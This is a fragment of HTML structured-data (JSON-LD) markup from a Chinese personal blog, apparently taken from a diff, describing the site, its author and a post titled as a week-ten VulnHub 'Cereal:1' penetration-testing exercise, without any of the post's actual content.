ite Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/categories/网络攻防实战/","name":"网络攻防实战"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/vulnhub-Cereal/","name":"【渗透测试】第十周 vulnhub-Cereal:1"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"【渗透测试】第十周 vulnhub-Cereal:1","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/vulnhub-Cereal/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/vulnhub-Cereal/","wordCount":0,"datePublished":"2022-11-26T07:59:32.000Z","dateModified":"2022-11-26T08:07:41.195Z","articleSection":"网络攻防实战","keywords":"学习,Kali,网络,安全,Linux,vulnhub","image":{"@type":"ImageObject","url":"/media/渗透测试学习笔记/kali-ascii-16x9.png","width":1024,"height":768}}]</script>
 
 
 
